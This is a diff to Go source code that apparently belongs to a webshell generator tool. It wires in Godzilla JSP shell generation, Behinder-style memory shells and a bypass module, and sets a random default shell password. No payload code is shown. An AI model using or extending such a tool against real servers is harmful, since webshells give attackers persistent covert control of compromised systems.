@@ -2,6 +2,7 @@ package shell
 
 import (
 	"webshell/common"
+	"webshell/shell/Godzilla"
 	"webshell/shell/bypass"
 	"webshell/shell/memory/Behinder/BeResin"
 	"webshell/shell/memory/Behinder/Bespring"
@@ -13,15 +14,19 @@ import (
 )
 
 func Exec() {
-	common.Parse1()
 	common.Flag()
-	Bypass()
+	common.Parse1()
 	Common()
+	Bypass()
+	Godzilla.Jspshell()
 	Meme()
 	common.File()
 }
 
 func Common() {
+	if common.Password == " " {
+		common.Password = common.RandStr(5)
+	}
 	if common.Webshell != " " {
 		switch common.Webshell {
 		case "php":
@@ -79,5 +84,8 @@ func Bypass() {
 		case "php":
 			bypass.Phpbypass()
 		}
+	}
+	if common.Memory == "be" && common.Encode == "unicode" {
+		Godzilla.Jspun()
 	}
 }
